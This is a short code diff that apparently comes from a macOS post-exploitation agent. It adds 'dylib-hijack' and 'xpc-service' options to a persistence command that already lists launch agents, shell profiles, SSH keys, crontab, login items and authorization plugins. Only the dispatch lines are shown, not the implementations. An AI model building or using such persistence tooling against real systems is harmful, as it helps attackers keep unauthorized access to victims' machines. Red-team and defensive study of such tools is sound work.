@@ -62,10 +62,14 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistLoginItem(args)
 	case "auth-plugin", "authorization-plugin", "authplugin":
 		return persistAuthPlugin(args)
+	case "dylib-hijack", "dylib", "dylibhijack":
+		return persistDylibHijack(args)
+	case "xpc-service", "xpc", "xpcservice":
+		return persistXPCService(args)
 	case "list":
 		return persistDarwinList()
 	default:
-		return errorf("Unknown method: %s. Use: launchagent, shell-profile, ssh-key, crontab, periodic, folder-action, login-item, auth-plugin, or list", args.Method)
+		return errorf("Unknown method: %s. Use: launchagent, shell-profile, ssh-key, crontab, periodic, folder-action, login-item, auth-plugin, dylib-hijack, xpc-service, or list", args.Method)
 	}
 }
 
